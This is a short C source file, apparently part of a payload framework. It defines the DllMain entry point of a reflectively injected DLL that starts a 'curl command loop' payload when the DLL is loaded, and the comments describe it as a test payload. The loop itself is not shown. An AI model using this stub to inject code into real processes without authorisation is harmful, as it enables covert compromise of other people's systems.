#include <winsock2.h>
#include <windows.h>

int run_main(char** argv, int argc, char** ergv, char** apple);

/* ReflectiveLoader.h defines DLL_QUERY_HMODULE (the mingw headers don't). */
#include "dll/src/ReflectiveLoader.h"

/* The ReflectiveLoader calls the DLL entry point with DLL_PROCESS_ATTACH
 * after mapping the image, so this is where the injected payload starts. */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
  switch (dwReason)
  {
    case DLL_PROCESS_ATTACH:
      /* Runs the app (curl command loop) in the loader thread. Blocks
       * DllMain -- acceptable for a test payload. */
      run_main(0, 0, 0, 0);
      break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
      break;
  }
  return TRUE;
}
